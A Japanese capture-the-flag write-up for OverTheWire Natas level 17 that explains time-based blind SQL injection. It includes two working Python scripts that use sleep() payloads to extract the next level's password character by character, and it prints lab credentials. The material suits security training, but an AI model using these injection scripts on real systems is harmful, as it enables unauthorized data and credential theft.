# Natas17
```
Username: natas17
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
URL:      http://natas17.natas.labs.overthewire.org
```

とりあえず`View sourcecode`

Level15と同じ感じだが、出力結果がコメントアウトされているので表示されない。  
これではLevel15で使用した「This user exit」と表示されたらその文字が使われているという手法が使えない。  
そこで`time-based injection`という手法を使う

## time-based injectionとは？
実行させるSQL分にsleep(秒数)を追加することで、そのSQLが実行(正)された場合に秒数待つようにする。  
指定秒数かかれば使われている(正)ということであり、かからなければ使われていない(負)であるとわかる。  

Pythonが書けないのでChat GPT君に手伝ってもらいました↓  
使われている場合は5秒待機するように`sleep(5)`を追加しています。

```
import requests
import time

url = 'http://natas17.natas.labs.overthewire.org/'
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'
payload = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
used_chars = ""

session = requests.Session()
session.auth = (username, password)

def get_response_time(payload_char):
    data = {
        'username': f'natas18" AND password LIKE BINARY "%{payload_char}%" AND sleep(5) # '
    }
    start_time = time.time()
    response = session.post(url, data=data, stream=True)  # stream=Falseで即時のレスポンスを取得
    end_time = time.time()
    return end_time - start_time

for char in payload:
    response_time = get_response_time(char)
    print(f"Character '{char}': {response_time} seconds")
    if response_time > 5:
        used_chars += char

print(f"Used characters: {used_chars}")
```

これによって、  
`468DEFGJLNPQUVZagknoquvwx`  
が使われていることがわかる。  

これをpayloadにセットしてLevel15のようにすれば良い
```
import requests
import time

url = 'http://natas17.natas.labs.overthewire.org/index.php'
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'
known_chars = "468DEFGJLNPQUVZagknoquvwx"

session = requests.Session()
session.auth = (username, password)

def test_password(test_password):
    data = {
        'username': f'natas18" AND password LIKE BINARY "{test_password}%" AND sleep(5) -- '
    }
    start_time = time.time()
    response = session.post(url, data=data)
    end_time = time.time()
    return end_time - start_time

def find_next_char(password):
    for char in known_chars:
        test_password_str = password + char
        response_time = test_password(test_password_str)
        print(f"Testing password: {test_password_str} - Response time: {response_time} seconds")
        if response_time >= 5:
            return char
    return None

found_password = ""
while len(found_password) < 32:
    next_char = find_next_char(found_password)
    if next_char is None:
        print("Failed to find next character.")
        break
    found_password += next_char

print("Generated password:", found_password)
```
得られる答えは
```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```